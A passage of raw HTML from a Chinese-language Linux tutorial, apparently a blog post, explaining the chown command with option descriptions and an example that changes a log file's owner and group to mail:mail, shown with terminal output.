&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;reference&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;目录或文件&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt; 把指定的目录&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;文件作为参考，把操作的文件&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;目录设置成参考文件&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;目录相同拥有者和群组&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b95647014400-2&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;当前用户：当前群组&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt; 只有当前用户和群组跟指定的用户和群组相同时才进行改变&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b95647014400-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;help&lt;/span&gt; 显示帮助信息&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b95647014400-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;version&lt;/span&gt; 显示版本信息&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0005 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;4．使用实例：&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;实例1：改变拥有者和群组&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;命令：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587abc0e58b98107528452&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
chown mail:mail log2012.log&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b98107528452-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b98107528452-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;输出：　&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587abc0e58b9b513174287&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test6]# ll
---xr--r-- 1 root users 302108 11-30 08:39 linklog.log
---xr--r-- 1 root users 302108 11-30 08:39 log2012.log
-rw-r--r-- 1 root users     61 11-30 08:39 log2013.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2014.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2015.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2016.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2017.log
[root@localhost test6]# chown mail:mail log2012.log 
[root@localhost test6]# ll
---xr--r-- 1 root users 302108 11-30 08:39 linklog.log
---xr--r-- 1 mail mail  302108 11-30 08:39 log2012.log
-rw-r--r-- 1 root users     61 11-30 08:39 log2013.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2014.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2015.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2016.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2017.log
[root@localhost test6]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b9b513174287-18&quot;&gt;18&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b9b513174287-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b9b513174287-2&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b9b513174287-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b9b513174287-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b9b513174287-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b9b513174287-6&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b9b513174287-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b9b513174287-8&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b9b513174287-9&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# chown mail:mail log2012.log &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b9b513174287-10&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b9b513174287-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span 